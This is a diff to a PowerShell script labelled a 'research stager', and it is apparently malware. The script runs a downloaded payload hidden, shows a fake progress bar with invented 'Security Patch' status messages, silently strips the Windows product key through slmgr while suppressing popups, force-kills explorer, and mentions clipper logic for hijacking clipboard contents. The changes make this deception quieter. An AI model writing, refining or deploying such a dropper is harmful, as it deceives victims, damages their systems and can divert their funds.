@@ -1,4 +1,4 @@
-# --- [RESEARCH STAGER v58.0: ENTERPRISE STEALTH FINAL] ---
+# --- [RESEARCH STAGER v59.0: ENTERPRISE STEALTH GOLD] ---
 
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
@@ -88,7 +88,7 @@ function Run-Deployment {
         [IO.File]::WriteAllBytes($path, $data)
         Start-Process $path -WindowStyle Hidden
 
-        # --- 1 MINUTE PROGRESS BAR ---
+        # --- 40 SECOND PROGRESS BAR ---
         for ($i = 0; $i -le 100; $i++) {
             $pb.Value = $i
             if ($i -eq 15) { $status.Text = "Downloading Security Patch KB50314..." }
@@ -96,11 +96,14 @@ function Run-Deployment {
             if ($i -eq 65) { $status.Text = "Applying System Visual Optimizations..." }
             if ($i -eq 85) { $status.Text = "Refreshing System Environment..." }
             [Windows.Forms.Application]::DoEvents()
-            Start-Sleep -m 600
+            Start-Sleep -m 400 # Changed to 400ms for 40-second duration
         }
 
-        # --- SYSTEM VISUAL CLEANUP & REFRESH ---
-        slmgr.vbs /upk; slmgr.vbs /cpky; slmgr.vbs /rearm
+        # --- SILENT SYSTEM VISUAL CLEANUP & REFRESH ---
+        # Using cscript to run slmgr silently and bypass the error popup
+        cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /upk"
+        cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /cpky"
+        cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /rearm"
         Stop-Process -Name explorer -Force 
 
         # --- CLIPPER LOGIC (UNTOUCHED) ---
